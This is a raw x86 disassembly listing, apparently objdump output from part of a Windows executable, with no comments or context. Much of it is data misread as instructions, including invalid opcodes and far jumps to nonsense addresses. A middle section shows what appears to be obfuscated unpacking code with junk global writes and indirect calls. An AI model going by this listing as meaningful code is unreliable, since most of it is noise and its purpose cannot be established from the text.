  404b7e:	fild   DWORD PTR [ebx-0x7632fc8b]
  404b84:	mov    WORD PTR [ebp-0x2a],gs
  404b87:	push   cs
  404b88:	sub    eax,0x778ea108
  404b8d:	call   0x3b22:0xa8074088
  404b94:	add    eax,0x1420ac72
  404b99:	xchg   ecx,eax
  404b9a:	scas   al,BYTE PTR es:[edi]
  404b9b:	popa   
  404b9c:	pop    esp
  404b9d:	test   BYTE PTR [esi+0x2ca0778c],dl
  404ba3:	inc    ecx
  404ba4:	dec    esi
  404ba5:	inc    edi
  404ba6:	mov    es,WORD PTR [edx+0x21]
  404ba9:	sub    al,0x29
  404bab:	or     DWORD PTR [ecx-0x2b08fb64],ebp
  404bb1:	in     al,dx
  404bb2:	xchg   esi,eax
  404bb3:	(bad)  
  404bb5:	xchg   ebx,eax
  404bb6:	cwde   
  404bb7:	stos   BYTE PTR es:[edi],al
  404bb8:	in     al,dx
  404bb9:	je     0x404bef
  404bbb:	bound  ebx,QWORD PTR [edi-0x580d1d4c]
  404bc1:	xchg   bl,bl
  404bc3:	mov    al,0x8b
  404bc5:	mov    bh,0xe4
  404bc7:	ja     0x404b94
  404bc9:	repnz xchg esp,eax
  404bcb:	clc    
  404bcc:	push   ebp
  404bcd:	push   ebx
  404bce:	xchg   esi,eax
  404bcf:	lock ins BYTE PTR es:[edi],dx
  404bd1:	xor    al,0xad
  404bd3:	push   ecx
  404bd4:	add    ebx,eax
  404bd6:	sbb    ebp,ebx
  404bd8:	ror    BYTE PTR [eax-0x3b65e793],0x55
  404bdf:	cmp    DWORD PTR [edx+0x66],edx
  404be2:	inc    edx
  404be3:	sar    BYTE PTR [ebp+0x59],0xcf
  404be7:	push   0x2d
  404be9:	push   ecx
  404bea:	add    BYTE PTR [esi+0x6f94fcb4],bl
  404bf0:	hlt    
  404bf1:	ret    0xde62
  404bf4:	add    BYTE PTR [ebx+0x760b5737],0xa7
  404bfb:	mov    ebx,0xa7144718
  404c00:	push   edx
  404c01:	xlat   BYTE PTR ds:[ebx]
  404c02:	dec    eax
  404c03:	push   edx
  404c04:	out    dx,al
  404c05:	je     0x404bc5
  404c07:	imul   ebp,DWORD PTR [edi],0xffffffc6
  404c0a:	js     0x404b8f
  404c0c:	loopne 0x404c5d
  404c0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c0f:	mov    edx,0x289d02ab
  404c14:	cmp    DWORD PTR [ebp-0x6089cc9c],ecx
  404c1a:	sahf   
  404c1b:	scas   eax,DWORD PTR es:[edi]
  404c1c:	add    al,BYTE PTR [ebp+ebp*1-0x33989c2d]
  404c23:	mov    bl,0xd6
  404c25:	xor    ch,bh
  404c27:	xor    DWORD PTR [edx],0x43
  404c2a:	jle    0x404c68
  404c2c:	inc    esi
  404c2d:	push   ss
  404c2e:	in     al,0xa4
  404c30:	jo     0x404bbc
  404c32:	mov    ds:0x17e46891,al
  404c37:	(bad)
  404c3a:	mov    dh,0x74
  404c3c:	out    dx,al
  404c3d:	imul   eax,esi,0x12
  404c40:	fimul  WORD PTR [ebp+0x3c216aae]
  404c46:	dec    edx
  404c47:	push   ebp
  404c49:	push   edi
  404c4a:	cwde   
  404c4b:	lahf   
  404c4c:	xchg   BYTE PTR [edx+eax*8+0x6b],cl
  404c50:	sahf   
  404c51:	test   ah,cl
  404c53:	dec    esi
  404c54:	sbb    eax,0xfe4a0f
  404c59:	add    BYTE PTR [edx],ah
  404c5b:	xchg   ebp,eax
  404c5c:	inc    edx
  404c5d:	add    ecx,edi
  404c5f:	push   esp
  404c60:	jg     0x404c1a
  404c62:	mov    ecx,0xef247490
  404c67:	out    0x8b,eax
  404c69:	addr16 dec esp
  404c6b:	enter  0xf77,0x39
  404c6f:	mov    bl,0xa9
  404c71:	ins    BYTE PTR es:[edi],dx
  404c72:	adc    edx,ebp
  404c74:	ret    0x6ae7
  404c77:	stos   DWORD PTR es:[edi],eax
  404c78:	fsub   st,st(5)
  404c7a:	mov    dl,0xc0
  404c7c:	xor    eax,0x6c1a2f32
  404c81:	jbe    0x404c74
  404c83:	shrd   edx,esp,cl
  404c86:	lea    esi,[eax]
  404c88:	pop    ebx
  404c89:	xor    DWORD PTR [edi+eax*8-0xdfc3fa8],ebp
  404c90:	ret    0xf365
  404c93:	sti    
  404c94:	mov    bh,0x57
  404c96:	add    al,BYTE PTR [esi+0x67]
  404c99:	loope  0x404c5b
  404c9b:	pop    ebp
  404c9c:	lea    edi,[ecx+0x5a]
  404c9f:	dec    ebp
  404ca0:	add    DWORD PTR [edi],ebp
  404ca2:	cmc    
  404ca3:	mov    esp,0x170091e0
  404ca8:	xchg   edi,eax
  404ca9:	sub    DWORD PTR [ecx+0x39],esi
  404cac:	push   es
  404cad:	bound  esp,QWORD PTR [eax]
  404caf:	cmp    BYTE PTR [edi-0x73],bh
  404cb2:	jne    0x404cf4
  404cb4:	inc    ecx
  404cb5:	aam    0x65
  404cb7:	jae    0x404c5e
  404cb9:	fld    st(4)
  404cbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cbc:	popf   
  404cbd:	mov    DWORD PTR [ebp+0x1f1d5a0e],ebp
  404cc3:	jmp    0x79ab1656
  404cc8:	fisubr WORD PTR [edx+0x2f4d0d6]
  404cce:	stos   BYTE PTR es:[edi],al
  404ccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cd0:	add    DWORD PTR [edx+0x52],0xffffffec
  404cd4:	ret    
  404cd5:	stos   BYTE PTR es:[edi],al
  404cd6:	gs scas al,BYTE PTR es:[edi]
  404cd8:	jo     0x404cb4
  404cda:	imul   edx,DWORD PTR [ebx-0x27],0xffffffbb
  404cde:	dec    edi
  404cdf:	push   edi
  404ce0:	clc    
  404ce1:	and    DWORD PTR [ebp+esi*4+0x4d],ebp
  404ce5:	call   0x6c6380bc
  404cea:	cmp    eax,ebx
  404cec:	aaa    
  404ced:	pop    ebx
  404cee:	rcr    DWORD PTR ds:0x129e1740,1
  404cf4:	retf   0x936a
  404cf7:	call   esi
  404cf9:	mov    bh,0x32
  404cfb:	repnz pop ss
  404cfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cfe:	lods   eax,DWORD PTR ds:[esi]
  404cff:	xor    al,BYTE PTR [esi-0x56]
  404d02:	stos   DWORD PTR es:[edi],eax
  404d03:	inc    ebp
  404d04:	adc    ebp,edi
  404d06:	rcr    DWORD PTR [ecx-0x67],1
  404d09:	pusha  
  404d0a:	test   BYTE PTR [edx],0x94
  404d0d:	push   0xf39de784
  404d12:	mov    gs,WORD PTR [ecx+ecx*8-0x70cc7acc]
  404d19:	dec    ebx
  404d1a:	cmp    BYTE PTR [edx+0x29],dl
  404d1d:	adc    eax,0x6b873df2
  404d22:	push   es
  404d23:	adc    dh,ah
  404d25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d26:	jmp    0x3624:0x9ac81b37
  404d2d:	jae    0x404d52
  404d2f:	pop    ebp
  404d30:	int    0x3d
  404d32:	cmp    al,0x16
  404d34:	pop    edx
  404d35:	add    BYTE PTR [edi],0x2f
  404d38:	push   cs
  404d39:	inc    eax
  404d3a:	loop   0x404ce6
  404d3c:	mov    al,0x37
  404d3e:	std    
  404d3f:	pop    ds
  404d40:	or     esp,DWORD PTR [ebx-0x4cdbe982]
  404d46:	div    BYTE PTR [edx+ebx*8-0x1c4e55bd]
  404d4d:	rcl    BYTE PTR [edx+0x4c62d8b5],cl
  404d53:	add    esi,0x30a9d42a
  404d59:	mov    cl,al
  404d5b:	call   0x16f43e12
  404d60:	pop    esp
  404d62:	jns    0x404cec
  404d64:	dec    edi
  404d65:	add    al,0x56
  404d67:	push   ebp
  404d68:	sub    al,0x7d
  404d6a:	mov    eax,ds:0xf3f01873
  404d6f:	mov    esi,0xb6cbf3cc
  404d74:	mov    DWORD PTR [edx+ebp*4],edi
  404d77:	and    DWORD PTR [edi-0x575708a8],ebp
  404d7d:	push   es
  404d7e:	lods   eax,DWORD PTR ds:[esi]
  404d7f:	add    BYTE PTR [ebp-0x18d66c6a],dh
  404d85:	adc    dh,ch
  404d87:	je     0x404da0
  404d89:	out    dx,eax
  404d8a:	xchg   edx,eax
  404d8b:	push   ebx
  404d8c:	ror    bh,cl
  404d8e:	sub    BYTE PTR [ecx],dh
  404d90:	in     al,dx
  404d91:	cli    
  404d92:	xchg   edi,eax
  404d93:	ret    
  404d94:	and    DWORD PTR [esi+0x20],ebp
  404d97:	leave  
  404d98:	dec    esi
  404d99:	rcl    DWORD PTR [esi+ebx*8-0x6ea65cc4],0x46
  404da1:	in     eax,0xf5
  404da3:	imul   ecx,DWORD PTR [edx+0x5e06b824],0x3a
  404daa:	fmul   DWORD PTR [ebx-0x27]
  404dad:	shl    al,0x73
  404db0:	push   ds
  404db1:	call   0x2bf2b5c1
  404db6:	push   eax
  404db7:	out    0x14,al
  404db9:	jg     0x404d42
  404dbb:	inc    esi
  404dbc:	mov    edi,DWORD PTR [esi+0x48a5d8a2]
  404dc2:	les    esp,FWORD PTR [edx]
  404dc4:	jae    0x404dfe
  404dc6:	lock add DWORD PTR es:[ebp-0x5f],edx
  404dcb:	sbb    cl,BYTE PTR [ebx-0x6a]
  404dce:	mov    ebp,0x37229a62
  404dd3:	imul   ecx,ebp,0x3a
  404dd6:	cwde   
  404dd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dd8:	in     eax,dx
  404dd9:	scas   eax,DWORD PTR es:[edi]
  404dda:	mov    ebx,0x2c4a7514
  404ddf:	or     bl,cl
  404de1:	call   0x229119ed
  404de6:	sbb    eax,0x8c36a841
  404deb:	test   al,0xfb
  404dee:	shr    ah,cl
  404df0:	addr16 mov ecx,0x244a7aa
  404df6:	clc    
  404df7:	xlat   BYTE PTR ds:[ebx]
  404df8:	in     al,0x46
  404dfa:	pop    esp
  404dfb:	or     al,0xac
  404dfd:	repz lds eax,FWORD PTR [ebx+esi*8]
  404e01:	mov    al,ds:0x461c5c2b
  404e06:	adc    al,BYTE PTR [ecx]
  404e08:	xchg   esi,eax
  404e09:	mov    esp,edx
  404e0b:	rcr    BYTE PTR [edx],0x7
  404e0e:	jne    0x404dad
  404e10:	je     0x404e0a
  404e12:	outs   dx,BYTE PTR ds:[esi]
  404e13:	mov    es,WORD PTR [edi-0x5f]
  404e16:	jne    0x404e2a
  404e18:	cmp    eax,0xd0656952
  404e1d:	(bad)  
  404e1e:	std    
  404e1f:	jl     0x4b9b023e
  404e25:	inc    esp
  404e26:	out    dx,al
  404e27:	cmp    DWORD PTR [ebp+0x7a],eax
  404e2a:	jecxz  0x404e78
  404e2c:	lods   eax,DWORD PTR ds:[esi]
  404e2d:	fisttp DWORD PTR [edi+0x7789010c]
  404e33:	jnp    0x404dcd
  404e35:	cdq    
  404e36:	jb     0x404e49
  404e38:	and    DWORD PTR [ebp-0x21],0x70
  404e3c:	push   esi
  404e3d:	xor    al,0x94
  404e3f:	bndldx (bad),[ecx-0x9]
  404e43:	mov    bh,0xef
  404e45:	int3   
  404e46:	add    bl,cl
  404e48:	cs mov bl,0x2a
  404e4b:	adc    BYTE PTR [ecx+0x33],bl
  404e4e:	addr16 mov ebx,0xd15f87f2
  404e55:	loope  0x404e73
  404e57:	mov    BYTE PTR gs:[edi+ebp*4-0x1f],bh
  404e5c:	ja     0x404e6d
  404e5e:	adc    DWORD PTR [ebx-0x4b],ebp
  404e61:	(bad)  
  404e62:	lock add al,0xc3
  404e65:	xchg   ecx,eax
  404e66:	ror    DWORD PTR [eax+0x6a],0x3a
  404e6a:	(bad)  
  404e6b:	(bad)  
  404e6d:	and    DWORD PTR [eax-0x1bea37c8],edi
  404e73:	sbb    DWORD PTR [edi+0x2eed958d],0x6d09cc6b
  404e7d:	inc    edi
  404e7e:	and    al,cl
  404e80:	mov    WORD PTR ss:[esi-0x46],ds
  404e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e85:	push   eax
  404e86:	xor    bl,BYTE PTR [esi-0x27]
  404e89:	cld    
  404e8a:	mov    dl,0xd4
  404e8c:	sbb    al,0x63
  404e8e:	(bad)  
  404e8f:	mov    ch,0xd1
  404e91:	aas    
  404e92:	aam    0x9f
  404e94:	inc    ebx
  404e95:	je     0x404f07
  404e97:	xor    DWORD PTR [ecx+eax*4],edi
  404e9a:	cld    
  404e9b:	mov    DWORD PTR [edx],ebx
  404e9d:	xchg   DWORD PTR [esi+0x1f],ebp
  404ea0:	addr16 push ss
  404ea2:	ret    0x7365
  404ea5:	mov    edi,0x42593b8a
  404eaa:	mov    cl,BYTE PTR [edx]
  404eac:	sahf   
  404ead:	and    BYTE PTR [edx+0x374d6109],0x65
  404eb4:	mov    esi,ds
  404eb6:	add    edx,DWORD PTR [esi+0x50704bae]
  404ebc:	push   eax
  404ebd:	jo     0x404efb
  404ebf:	(bad)  
  404ec0:	test   eax,0x471e5063
  404ec5:	jbe    0x404f0a
  404ec7:	test   eax,0xa8a5f0a8
  404ecc:	mov    cl,BYTE PTR [ebx]
  404ece:	unpcklps xmm2,xmm3
  404ed1:	sub    dh,BYTE PTR [ebp+0x17]
  404ed4:	mov    ss,WORD PTR [ebx+eiz*8-0x433f4be7]
  404edb:	adc    BYTE PTR [ebx+eiz*2-0x55],dl
  404edf:	push   ds
  404ee0:	jno    0x404ee4
  404ee2:	fbstp  TBYTE PTR [ecx]
  404ee4:	int3   
  404ee5:	je     0x404f25
  404ee7:	lds    ecx,FWORD PTR [ebx-0x300874f2]
  404eed:	jecxz  0x404ebb
  404eef:	jmp    0x72ad:0x5ea96040
  404ef6:	sbb    eax,0xd67eb169
  404efb:	add    DWORD PTR ds:0xf79442da,0x8
  404f02:	jmp    0x1d4191bf
  404f07:	and    eax,0xe8b954b1
  404f0c:	repnz frndint 
  404f0f:	mov    ah,0xf6
  404f11:	mov    BYTE PTR [edx+0x2ecc26a0],ch
  404f17:	das    
  404f18:	in     eax,dx
  404f19:	or     eax,DWORD PTR [ecx]
  404f1b:	mov    bh,0x49
  404f1d:	rsqrtps xmm6,XMMWORD PTR [ecx+ebp*8]
  404f21:	mov    ds:0x4e8f59ea,al
  404f26:	sbb    dh,BYTE PTR [ebx+0x6c3d12ec]
  404f2c:	or     edx,DWORD PTR [ebp-0x1c]
  404f2f:	sbb    DWORD PTR ds:0x4282bb,0x7456
  404f39:	shl    ecx,0x1e
  404f3c:	lea    ecx,[edx+eax*1]
  404f3f:	adc    edx,DWORD PTR ds:0x4282c7
  404f45:	mov    eax,DWORD PTR [ebx]
  404f47:	or     DWORD PTR ds:0x4283db,edi
  404f4d:	mov    edx,DWORD PTR [ebx+0x4]
  404f50:	mov    DWORD PTR ds:0x4283b7,0x1480
  404f5a:	shrd   eax,edx,0x2
  404f5e:	adc    DWORD PTR ds:0x4283c3,0x1a3a
  404f68:	shr    edx,0x2
  404f6b:	cmp    DWORD PTR ds:0x4283c3,0x0
  404f72:	mov    DWORD PTR ds:0x428353,ebx
  404f78:	mov    DWORD PTR ds:0x4283cb,0x56b3
  404f82:	mov    DWORD PTR ds:0x4282ab,0x1c7d
  404f8c:	jmp    0x405004
  404f91:	mov    DWORD PTR ds:0x42827f,ebx
  404f97:	mov    DWORD PTR ds:0x4282b7,0x5683
  404fa1:	cmp    DWORD PTR ds:0x4283c3,0x0
  404fa8:	jg     0x404fd2
  404fae:	push   0x428f
  404fb3:	push   DWORD PTR [ebp-0x14]
  404fb6:	call   DWORD PTR ds:0x428dcc
  404fbc:	and    edx,DWORD PTR ds:0x428363
  404fc2:	sub    DWORD PTR ds:0x42828f,ecx
  404fc8:	or     DWORD PTR ds:0x428283,0xf0b
  404fd2:	adc    DWORD PTR ds:0x4281bf,0x4903
  404fdc:	mov    edx,DWORD PTR ds:0x4283a3
  404fe2:	mov    edx,DWORD PTR [edx]
  404fe4:	add    DWORD PTR ds:0x4281ab,edx
  404fea:	xor    edx,edx
  404fec:	xor    edx,DWORD PTR ds:0x4281a3
  404ff2:	xor    DWORD PTR ds:0x4282e3,edx
  404ff8:	mov    edx,DWORD PTR ds:0x4282b7
  404ffe:	add    DWORD PTR ds:0x4283db,edx
  405004:	mov    DWORD PTR [ebp-0x1c],eax
  405007:	mov    eax,ds:0x4282e3
  40500c:	add    DWORD PTR ds:0x4282bb,eax
  405012:	mov    eax,DWORD PTR [ebx]
  405014:	sub    edx,0x532
  40501a:	mov    edx,DWORD PTR [ebx+0x4]
  40501d:	xor    DWORD PTR [ebp-0x1c],edi
  405020:	mov    edx,eax
  405022:	xor    eax,eax
  405024:	add    DWORD PTR ds:0x4283c3,0x32cc
  40502e:	or     eax,DWORD PTR [ebp-0x1c]
  405031:	sub    DWORD PTR ds:0x4283cf,0x1679
  40503b:	shl    edx,0x1e
  40503e:	and    DWORD PTR ds:0x4281b7,edi
  405044:	imul   eax,ecx
  405047:	mov    ecx,DWORD PTR [ebx]
  405049:	mov    edx,DWORD PTR [ebx+0x4]
  40504c:	shrd   ecx,edx,0x2
  405050:	sbb    DWORD PTR ds:0x4283df,0x5de1
  40505a:	mov    DWORD PTR [ebp-0x1c],ecx
  40505d:	sbb    DWORD PTR ds:0x4282cf,0x3a7c
  405067:	mov    ecx,DWORD PTR [ebx]
  405069:	adc    DWORD PTR ds:0x4281c3,0x4282a7
  405073:	xor    DWORD PTR [ebp-0x1c],edi
  405076:	shr    edx,0x2
  405079:	adc    DWORD PTR ds:0x4283bb,ecx
  40507f:	mov    edx,DWORD PTR [ebx+0x4]
  405082:	mov    edx,ecx
  405084:	xor    ecx,ecx
  405086:	mov    DWORD PTR ds:0x4283cb,0x321a
  405090:	or     ecx,DWORD PTR [ebp-0x1c]
  405093:	adc    DWORD PTR ds:0x4282bb,0x4283c7
  40509d:	shl    edx,0x1e
  4050a0:	or     DWORD PTR ds:0x4282b3,0x4282d3
  4050aa:	sub    ecx,eax
  4050ac:	mov    eax,DWORD PTR [ebp-0xc]
  4050af:	mov    DWORD PTR ds:0x428287,0x7aa6
  4050b9:	cmp    DWORD PTR [eax],ecx
  4050bb:	not    eax
  4050bd:	mov    eax,DWORD PTR [ebp-0xc]
  4050c0:	mov    DWORD PTR ds:0x4283bb,0x460d
  4050ca:	jg     0x405287
  4050d0:	mov    ecx,DWORD PTR [ebp+0x18]
  4050d3:	xor    DWORD PTR ds:0x4283cb,edx
  4050d9:	mov    edx,DWORD PTR [ebp+0x1c]
  4050dc:	sbb    DWORD PTR ds:0x4283d7,0x42827b
  4050e6:	shrd   ecx,edx,0x2
  4050ea:	sbb    DWORD PTR ds:0x4282a3,0x42828f
  4050f4:	mov    DWORD PTR [ebp-0x1c],ecx
  4050f7:	mov    ecx,DWORD PTR [ebp+0x18]
  4050fa:	xor    DWORD PTR [ebp-0x1c],edi
  4050fd:	or     DWORD PTR ds:0x4282df,0x2ce0
  405107:	shl    ecx,0x1e
  40510a:	xor    ecx,ecx
  40510c:	and    DWORD PTR ds:0x4282bf,0x42829b
  405116:	or     ecx,DWORD PTR [ebp-0x1c]
  405119:	shr    edx,0x2
  40511c:	or     DWORD PTR ds:0x4281a7,ebx
  405122:	mov    edx,DWORD PTR [ebp+0x1c]
  405125:	mov    DWORD PTR [ebp-0x2c],ecx
  405128:	cmp    DWORD PTR ds:0x4283cb,0x0
  40512f:	mov    DWORD PTR ds:0x4281db,edx
  405135:	mov    DWORD PTR ds:0x4283ab,ecx
  40513b:	not    edx
  40513d:	jmp    0x405212
  405142:	mov    DWORD PTR ds:0x4281bb,0x795c
  40514c:	cmp    DWORD PTR ds:0x4283cb,0x0
  405153:	ja     0x40517c
  405159:	push   0x427fec
  40515e:	push   DWORD PTR [ebp-0x24]
  405161:	push   0x6923
  405166:	call   DWORD PTR ds:0x428df4
  40516c:	or     DWORD PTR ds:0x4282b3,0xa87
  405176:	add    ecx,DWORD PTR ds:0x4283e7
  40517c:	adc    ecx,DWORD PTR ds:0x4281cb
  405182:	xor    DWORD PTR ds:0x4281bb,0x1a4f
  40518c:	sbb    DWORD PTR ds:0x4282cf,edx
  405192:	cmp    DWORD PTR ds:0x42832b,0x0
  405199:	mov    DWORD PTR ds:0x428357,0x66a6
  4051a3:	mov    DWORD PTR ds:0x428337,ecx
  4051a9:	mov    ecx,0x67a4
  4051ae:	jmp    0x405212
  4051b3:	mov    edx,0x2152
  4051b8:	cmp    DWORD PTR ds:0x42832b,0x0
  4051bf:	jge    0x4051e9
  4051c5:	push   DWORD PTR [ebp-0x28]
  4051c8:	push   DWORD PTR [ebp-0x28]
  4051cb:	call   DWORD PTR ds:0x428df8
  4051d1:	inc    DWORD PTR ds:0x4282c7
  4051d7:	mov    ecx,DWORD PTR ds:0x428207
  4051dd:	mov    edx,DWORD PTR ds:0x428407
  4051e3:	sub    ecx,edx
  4051e5:	imul   ecx,DWORD PTR [ecx+edx*1]
  4051e9:	xor    DWORD PTR ds:0x42832b,0x4a74
  4051f3:	mov    edx,DWORD PTR ds:0x4281ff
  4051f9:	mov    edx,DWORD PTR [edx]
  4051fb:	sub    DWORD PTR ds:0x4282b3,edx
  405201:	mov    edx,DWORD PTR ds:0x428217
  405207:	mov    ecx,DWORD PTR ds:0x428407
  40520d:	sub    ecx,edx
  40520f:	and    edx,DWORD PTR [edx+ecx*1]
  405212:	mov    ecx,DWORD PTR [ebx]
  405214:	sub    DWORD PTR ds:0x4283bf,0x2089
  40521e:	mov    edx,DWORD PTR [ebx+0x4]
  405221:	shrd   ecx,edx,0x2
  405225:	shr    edx,0x2
  405228:	mov    DWORD PTR [ebp-0x1c],ecx
  40522b:	xor    edx,edx
  40522d:	xor    edx,DWORD PTR ds:0x4282cf
  405233:	sub    DWORD PTR ds:0x4281d3,edx
  405239:	mov    ecx,DWORD PTR [ebx]
  40523b:	inc    edx
  40523c:	mov    edx,DWORD PTR [ebx+0x4]
  40523f:	add    DWORD PTR ds:0x4283ab,0x35fe
  405249:	xor    DWORD PTR [ebp-0x1c],edi
  40524c:	xor    edx,edx
  40524e:	xor    DWORD PTR ds:0x4281b7,0x631d
  405258:	or     edx,DWORD PTR [ebp-0x1c]
  40525b:	xor    DWORD PTR ds:0x4282bf,0x4281c3
  405265:	shl    ecx,0x1e
  405268:	and    DWORD PTR ds:0x4283db,0x4282a7
  405272:	imul   edx,DWORD PTR [ebp-0x2c]
  405276:	add    DWORD PTR ds:0x4283d3,0x4996
  405280:	sub    DWORD PTR [eax],edx
  405282:	jmp    0x4058d5
  405287:	add    DWORD PTR ds:0x4281ab,0x42f2
  405291:	mov    ecx,DWORD PTR [esi]
  405293:	cmp    DWORD PTR ds:0x4282e3,0x0
  40529a:	mov    DWORD PTR ds:0x428273,0x7c0
  4052a4:	mov    edx,DWORD PTR ds:0x4282b3
  4052aa:	mov    DWORD PTR ds:0x42833b,0x4c43
  4052b4:	jmp    0x405321
  4052b9:	mov    DWORD PTR ds:0x4283e3,0x6b40
  4052c3:	mov    DWORD PTR ds:0x4282cb,0x2bfd
  4052cd:	cmp    DWORD PTR ds:0x4282e3,0x0
  4052d4:	jae    0x4052fc
  4052da:	push   0x4280a9
  4052df:	push   0x1ca9
  4052e4:	call   DWORD PTR ds:0x428dfc
  4052ea:	add    edx,DWORD PTR ds:0x42829b
  4052f0:	adc    edx,0x1702
  4052f6:	add    edx,DWORD PTR ds:0x4281c3
  4052fc:	and    DWORD PTR ds:0x4281cf,0x3bee
  405306:	dec    edx
  405307:	xor    edx,edx
  405309:	or     edx,DWORD PTR ds:0x4282a7
  40530f:	add    DWORD PTR ds:0x4282e3,edx
  405315:	mov    edx,DWORD PTR ds:0x4282cb
  40531b:	add    DWORD PTR ds:0x4281b3,edx
  405321:	mov    edx,DWORD PTR [esi+0x4]
  405324:	xor    DWORD PTR ds:0x428337,0x42826f
  40532e:	shrd   ecx,edx,0x2
  405332:	mov    DWORD PTR [ebp-0x1c],ecx
  405335:	cmp    DWORD PTR ds:0x428353,0x0
  40533c:	mov    DWORD PTR ds:0x42834f,edi
  405342:	mov    DWORD PTR ds:0x4282b7,ebx
  405348:	jmp    0x405426
  40534d:	mov    DWORD PTR ds:0x42835b,0x4d36
  405357:	mov    DWORD PTR ds:0x4283d7,0x1e95
  405361:	cmp    DWORD PTR ds:0x428353,0x0
  405368:	jb     0x405396
  40536e:	push   0x848f
  405373:	push   0x5d21
  405378:	call   DWORD PTR ds:0x428e00
  40537e:	not    ecx
  405380:	adc    DWORD PTR ds:0x4283df,ecx
  405386:	neg    ecx
  405388:	mov    ecx,DWORD PTR ds:0x42841f
  40538e:	mov    ecx,DWORD PTR [ecx]
  405390:	sub    DWORD PTR ds:0x4283bf,ecx
  405396:	mov    ecx,DWORD PTR ds:0x42828f
  40539c:	xor    DWORD PTR ds:0x42819b,ecx
  4053a2:	or     ecx,0x48b0
  4053a8:	sbb    DWORD PTR ds:0x4282bb,edx
  4053ae:	cmp    DWORD PTR ds:0x42833b,0x0
  4053b5:	mov    DWORD PTR ds:0x4281a7,edi
  4053bb:	not    DWORD PTR ds:0x42827b
  4053c1:	jmp    0x405426
  4053c6:	mov    DWORD PTR ds:0x4281d7,0xab0
  4053d0:	cmp    DWORD PTR ds:0x42833b,0x0
  4053d7:	jb     0x405406
  4053dd:	push   0x56df
  4053e2:	push   DWORD PTR [ebp-0x20]
  4053e5:	push   DWORD PTR [ebp-0x20]
  4053e8:	push   0x14ed
  4053ed:	push   DWORD PTR [ebp-0x24]
  4053f0:	call   DWORD PTR ds:0x428e04
  4053f6:	sub    ecx,DWORD PTR ds:0x4281db
  4053fc:	sub    DWORD PTR ds:0x42827b,0x6432
  405406:	or     DWORD PTR ds:0x42829f,0x3285
  405410:	adc    ecx,DWORD PTR ds:0x4281cf
  405416:	sub    DWORD PTR ds:0x4283d3,edi
  40541c:	mov    DWORD PTR ds:0x42827b,0x48f2
  405426:	mov    ecx,DWORD PTR [esi]
  405428:	xor    DWORD PTR [ebp-0x1c],edi
  40542b:	shl    ecx,0x1e
  40542e:	adc    DWORD PTR ds:0x4282b7,0xf0c
  405438:	xor    ecx,ecx
  40543a:	xor    DWORD PTR ds:0x42832f,0x1337
  405444:	or     ecx,DWORD PTR [ebp-0x1c]
  405447:	shr    edx,0x2
  40544a:	mov    edx,DWORD PTR ds:0x4283df
  405450:	sub    edx,DWORD PTR ds:0x428193
  405456:	mov    DWORD PTR ds:0x4283df,edx
  40545c:	jmp    0x40583a
  405461:	xchg   ecx,eax
  405462:	stc    
  405463:	xchg   ebp,eax
  405464:	out    dx,al
  405465:	ins    BYTE PTR es:[edi],dx
  405466:	push   0x6b
  405468:	jbe    0x405493
  40546a:	push   0x25
  40546c:	stos   BYTE PTR es:[edi],al
  40546d:	mov    DWORD PTR [ebx],ecx
  40546f:	jmp    0x18fa3b1e
  405474:	sbb    BYTE PTR [esi+0x1181812],bl
  40547a:	adc    edx,DWORD PTR [ecx+0x29]
  40547d:	pop    es
  40547e:	dec    esp
  40547f:	mov    edi,0xce91cf8e
  405484:	outs   dx,DWORD PTR ds:[esi]
  405485:	ss and al,0x6f
  405488:	mov    dl,0xdb
  40548a:	shl    BYTE PTR [ecx-0x6fa6a724],1
  405490:	mov    ebx,0x33816fe8
  405495:	pop    edi
  405496:	mov    bh,0xea
  405498:	add    ebx,DWORD PTR [edi+ebx*2+0x12630689]
  40549f:	push   ebp
  4054a0:	cmp    dl,BYTE PTR ds:0xf266b42c
  4054a6:	jne    0x4054f3
  4054a8:	fnstcw WORD PTR [edx]
  4054aa:	push   eax
  4054ab:	in     al,dx
  4054ac:	pop    ebp
  4054ad:	outs   dx,DWORD PTR ds:[esi]
  4054ae:	sub    cl,bh
  4054b0:	push   ebp
  4054b1:	cld    
  4054b2:	jnp    0x405516
  4054b4:	jmp    0xddf1:0x5db7cab
  4054bb:	inc    ebp
  4054bc:	push   edx
  4054bd:	dec    ebx
  4054be:	and    BYTE PTR [ebx+edx*1+0x770cc866],bh
  4054c5:	or     cl,BYTE PTR ds:0x4072c1f4
  4054cb:	sbb    DWORD PTR [eax-0x66],esi
  4054ce:	fdiv   st(2),st
  4054d0:	in     al,dx
  4054d1:	test   DWORD PTR [edi-0x7ff398d],edi
  4054d7:	mov    edx,0x5b38383b
  4054dc:	xor    BYTE PTR [eax],ah
  4054de:	sub    bl,ah
  4054e0:	out    0x62,al
  4054e2:	jle    0x4054ec
  4054e4:	mov    al,0x9
  4054e6:	sti    
  4054e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054e8:	repz mov esp,DWORD PTR [eax]
  4054eb:	inc    eax
  4054ec:	repz push esi
  4054ee:	push   ebx
  4054ef:	mov    bh,0xfa
  4054f1:	adc    BYTE PTR [ebx-0x7875c2d8],0xf4
  4054f8:	sub    bh,ah
  4054fa:	inc    ecx
  4054fb:	out    dx,al
  4054fc:	pop    edi
  4054fd:	repnz inc eax
  4054ff:	arpl   WORD PTR [ebx],si
  405501:	add    al,0xb8
  405503:	ja     0x4054a3
  405505:	loopne 0x405525
  405507:	loopne 0x4054d8
  405509:	jmp    0x6dc3e847
  40550e:	adc    eax,DWORD PTR [esi]
  405510:	sbb    DWORD PTR [ebx-0x8de0363],eax
  405516:	in     eax,dx
  405517:	test   al,0x12
  405519:	mov    ds:0x87e42c1b,al
  40551e:	jmp    0x383d:0xed7e0947
  405525:	cmp    DWORD PTR [ecx+0x6b0e9f19],esp
  40552b:	stos   DWORD PTR es:[edi],eax
  40552c:	dec    ebp
  40552d:	jmp    0x4054c1
  40552f:	stos   DWORD PTR es:[edi],eax
  405530:	sbb    edx,ecx
  405532:	or     DWORD PTR [eax+0x7f],ebx
  405535:	enter  0x2b1b,0xe4
  405539:	ror    BYTE PTR [edi+ebp*4-0x45aaf2e5],cl
  405540:	lods   eax,DWORD PTR ds:[esi]
  405541:	div    eax
